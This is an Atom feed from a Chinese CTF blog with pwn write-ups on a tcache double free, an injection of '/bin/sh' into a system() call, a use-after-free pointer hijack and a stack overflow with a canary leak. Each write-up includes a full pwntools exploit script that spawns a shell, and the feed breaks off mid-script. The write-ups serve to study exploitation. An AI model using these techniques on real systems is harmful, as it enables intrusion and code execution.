<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Requirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2019-03-02T07:25:12.250Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Introduction to pwn2.9-tcache_exploit</title>
    <link href="http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/"/>
    <id>http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/</id>
    <published>2019-03-02T06:02:54.000Z</published>
    <updated>2019-03-02T07:25:12.250Z</updated>
    
    <content type="html"><![CDATA[<p><em>为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。</em></p><h1 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h1><p>glibc 在2.26之后加入了tcache机制，之前仅仅大略看了下原理，基本没什么保护，这次h4lo大佬给的是tcache的题目，顺便来练练手，因为保护比fastbin还少，所以利用起来也比较简单。</p><p>简单来说，tcache相当于插队插在了fastbin 及 smallbin 前面，内部chunk大小不排序，且最多7个，malloc时优先在里面找，free时优先进入tcache，大小都要小于0x408，当然还有一些其他的机制就不多说了</p><h1 id="babytcache"><a href="#babytcache" class="headerlink" title="babytcache"></a>babytcache</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>三个功能 add delete show</p><p>add 最多九个chunk，固定malloc(0x50)，指针存放在bss段<br>delete 检查idx范围，之后仅仅free<br>show puts指针内容</p><p>保护：开了NX 及 Canary，No pie,got表可写</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看上去就是个tcache的练手题目，也基本没有检查</p><p>2.27版本的 tcache 甚至没有double free检查，也就是说，现在可以在没有其他chunk的情况下free一个chunk多次进入tcache</p><p>所以我们的思路很清晰– double free进入bss段，改变指针泄露libc地址</p><p>得到libc地址之后复写got表，getshell. (复写free不成功，不太清楚为什么，复写puts没问题)</p><ul><li>需要注意的是，tcache中有一个计数的tc_idx，也就是如果采用double free，会造成尝试分配到heap以外的时候，已经是第三次从tcache中取出chunk，而我们之前仅仅往里面放入了两个chunk，这样计数的tc_idx就会变成-1，结果便是我们可能之后无法再次使用tcache，此时free会略过tcache，malloc查询tcache时便会报错。</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babytcache&apos;)</span><br><span class="line">elf = ELF(&apos;./babytcache&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(con):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;content:&apos;,con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x6020e0+8))</span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line">add(p64(elf.got[&apos;free&apos;]))        //保证搞完后tcache没有被破坏</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;free_addr: &apos;+hex(free_addr)</span><br><span class="line">system_addr = free_addr - libc.symbols[&apos;free&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">add(&apos;/bin/sh&apos;)</span><br><span class="line">add(p64(system_addr))          //这个时候tcache已经坏了，但是不影响我们</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Tcache&quot;&gt;&lt;a href=&quot;#Tcache&quot; clas
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2019.2安恒月赛pwn</title>
    <link href="http://siriuswhiter.tk/2019/02/26/2019-2%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bpwn/"/>
    <id>http://siriuswhiter.tk/2019/02/26/2019-2安恒月赛pwn/</id>
    <published>2019-02-26T14:00:41.000Z</published>
    <updated>2019-02-27T08:14:00.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>重点函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall checksec(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-98h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x80uLL);</span><br><span class="line">  printf(&quot;Input the Index:&quot;, a2, &amp;s);</span><br><span class="line">  v3 = get_num();</span><br><span class="line">  if ( cnt &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    snprintf(&amp;s, 0x80uLL, &quot;echo \&quot;%s\&quot;| md5sum&quot;, (char *)&amp;ptr + 0x90 * v3 + 0x30);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No Such Index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给了几个函数，看了下没什么用，其中包括一个后门函数，但是限制两个字节且不能是sh，尝试vi提示没有安装，没有办法<br>checksec这边会执行几个指令，想办法绕过就好了，像web题一样</p><p>echo “” ; /bin/sh ; “”| md5sum  </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./filesystem&apos;)</span><br><span class="line">#sh = remote(&apos;101.71.29.5&apos;, 10017)</span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Create&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input Filename: &apos;)</span><br><span class="line">sh.sendline(&apos;aaaaa&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Edit&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input File Content: &apos;)</span><br><span class="line">sh.sendline(&apos;&quot;; /bin/sh ; &quot;&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Checksec&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>标准的选项题，有add print delete 功能</p><p>add 限制五次分配chunk，会先分配八个字节，分配用来存放一个print_moon_content函数指针及之后为用户分配的chunk指针，同时会在bss段存放为用户分配的chunk指针。<br>print 会检查输入的idx及bss段的指针，在指针存在的情况下，调用该指针处的函数，也就是之前存放的print_moon_content函数指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl print_moon_content(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(const char **)(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete 会将之前的两个指针依次free，但是其他的什么也没动，存在UAF问题</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>UAF漏洞很明显，同时指针被放到了堆中，很容易想到利用UAF控制指针即可，又同时，题中给了magic函数，所以想办法让magic函数指针覆盖某个chunk的指针就可以了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./hackmoon&apos;)</span><br><span class="line">elf = ELF(&apos;./hackmoon&apos;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;moon size :&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;Content :&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index, ):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Success\n&apos;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic= 0x8048986</span><br><span class="line">add(0x8,&apos;aaaaaaa&apos;)</span><br><span class="line">add(0x8,&apos;bbbbbbb&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x20,&apos;ccccccccc&apos;)</span><br><span class="line">add(0x8,&apos;deadbeef&apos;)</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x8,p32(magic)*2)</span><br><span class="line">show(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;filesystem&quot;&gt;&lt;a href=&quot;#filesystem&quot; class=&quot;headerlink&quot; title=&quot;filesystem&quot;&gt;&lt;/a&gt;filesystem&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>护网杯pwn复现</title>
    <link href="http://siriuswhiter.tk/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://siriuswhiter.tk/2019/02/15/护网杯pwn复现/</id>
    <published>2019-02-15T04:42:46.000Z</published>
    <updated>2019-03-02T06:52:01.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表面是个堆题，但实际上是个栈溢出。。。</p><p>给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn guess()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST04_4</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-80h]</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-80h]</span><br><span class="line">  signed int i; // [rsp+0h] [rbp-80h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int rand; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int max_cnt; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char s[32]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  char s1; // [rsp+40h] [rbp-40h]</span><br><span class="line">  char name; // [rsp+60h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v12; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;please input your name&quot;);</span><br><span class="line">  read(0, &amp;name, 0x20uLL);</span><br><span class="line">  memset(s, 0, 0x10uLL);</span><br><span class="line">  puts(&quot;Do you want to guess the secret?&quot;);</span><br><span class="line">  get_str(&amp;v8, 2LL);</span><br><span class="line">  if ( v8 == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( access(&quot;/tmp/secret&quot;, 0) == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL);</span><br><span class="line">      fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">      read(fd, s, 0xCuLL);</span><br><span class="line">      LODWORD(v1) = 0;</span><br><span class="line">      while ( (signed int)v1 &lt;= 11 )</span><br><span class="line">      &#123;</span><br><span class="line">        s[(signed int)v1] &amp;= 1u;</span><br><span class="line">        LODWORD(v1) = v1 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, 0xCuLL);</span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v0 = open(&quot;/tmp/secret&quot;, 0, v1);</span><br><span class="line">    read(v0, s, 0xCuLL);</span><br><span class="line">    close(v0);</span><br><span class="line">    puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;);</span><br><span class="line">    max_cnt = input_0x10();</span><br><span class="line">    if ( max_cnt &gt; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;What? Why do you need to encrypt so many times?&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;At least encrypt one time&quot;, s);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513);</span><br><span class="line">    LODWORD(v2) = 0;</span><br><span class="line">    while ( (unsigned int)v2 &lt; max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, 16LL, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(SHIDWORD(v2), s, 0x10uLL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    puts(&quot;Try to guess the md5 of the secret&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(0, &amp;s1, 0x10uLL);</span><br><span class="line">    if ( !memcmp(&amp;s1, s, 0x10uLL) )</span><br><span class="line">      secret((__int64)&amp;name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2);</span><br><span class="line">    rand = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">    read(rand, s, 0xCuLL);</span><br><span class="line">    for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">      s[i] &amp;= 1u;</span><br><span class="line">    write(v4, s, 0xCuLL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(rand);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Oh!bye %s\n&quot;, &amp;name);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall secret(__int64 name)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // ST1B_1</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-214h]</span><br><span class="line">  char occ; // [rsp+20h] [rbp-210h]</span><br><span class="line">  char s; // [rsp+120h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+228h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Congratulations, %s guessed my secret!\n&quot;, name);</span><br><span class="line">  puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;);</span><br><span class="line">  puts(&quot;What`s your occupation?&quot;);</span><br><span class="line">  get_str(&amp;occ, 0xFFLL);</span><br><span class="line">  v3 = snprintf(</span><br><span class="line">         &amp;s,</span><br><span class="line">         0xFFuLL,</span><br><span class="line">         &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot;</span><br><span class="line">         &quot;.................................................................................................&quot;,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occ);</span><br><span class="line">  puts(&quot;Here is your introduce&quot;);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">    read(0, &amp;s, v3 - 1);</span><br><span class="line">  return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下保护，除了PIE其他的都开了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了：</p><p>程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。</p><p>而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。</p><p>因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。</p><p><em>ps： 但是感觉后面的栈布局有点奇怪，之后再看一看</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line"></span><br><span class="line">def six(name,rd,secret,flag=1):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; \n&apos;)</span><br><span class="line">    sh.sendline(&apos;666&apos;)</span><br><span class="line">    sh.recvuntil(&apos;name\n&apos;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&apos;secret?\n&apos;)</span><br><span class="line">    sh.sendline(&apos;y&apos;)</span><br><span class="line">    sh.recvuntil(&apos;secret:\n&apos;)</span><br><span class="line">    sh.sendline(str(rd))</span><br><span class="line">    if flag == 1:</span><br><span class="line">        sh.recvuntil(&apos;secret\n&apos;)</span><br><span class="line">        sh.send(secret)</span><br><span class="line"></span><br><span class="line">six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)</span><br><span class="line">sh.recvuntil(&apos;timeout~&apos;)</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x19)</span><br><span class="line">canary = u64(&apos;\x00&apos;+sh.recvn(7))</span><br><span class="line">print &apos;canary: &apos;+hex(canary)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)     </span><br><span class="line">sh.send(shellcode)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Congratulations, &apos;)</span><br><span class="line">libc_addr = u64(sh.recvn(6) + &apos;\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]</span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span 